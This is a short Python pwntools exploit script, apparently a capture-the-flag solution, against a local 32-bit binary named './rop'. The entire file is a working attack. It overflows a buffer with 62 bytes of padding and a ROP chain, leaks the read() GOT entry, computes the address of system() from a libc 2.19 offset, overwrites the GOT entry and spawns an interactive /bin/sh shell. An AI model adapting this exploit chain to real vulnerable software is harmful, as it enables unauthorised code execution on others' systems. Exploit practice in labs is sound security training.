from pwn import *
from struct import *

binsh = "/bin/sh"

binary = ELF('./rop')

libc = ELF("/lib32/libc-2.19.so")
rop = ROP(binary)

print binary.checksec()

read_plt = binary.plt['read']
read_got = binary.got['read']
write_plt = binary.plt['write']
write_got = binary.got['write']
offset = libc.symbols['read'] - libc.symbols['system']

bss = 0x804a024

#Address Info
log.info("read@plt : " + str(hex(read_plt)))
log.info("read@got : " + str(hex(read_got)))
log.info("write@plt : " + str(hex(write_plt)))
log.info("write@got : " + str(hex(write_got)))
log.info("read - system offset : " + str(hex(offset)))
log.info("bss : " + str(hex(bss)))

#ROP
rop.read(0, bss, len(str(binsh)))
rop.write(1, read_got, 4)
rop.read(0, read_got, len(str(read_got)))
rop.raw(read_plt)
rop.raw(0xaaaabbbb)
rop.raw(bss)

payload = "A" * 62 + str(rop)

p = process('./rop')

p.recvuntil('\n')
p.send(payload)

p.send(binsh)
read = u32(p.recvn(4, timeout=1))
system = read - offset

p.send(p32(system))
p.interactive()
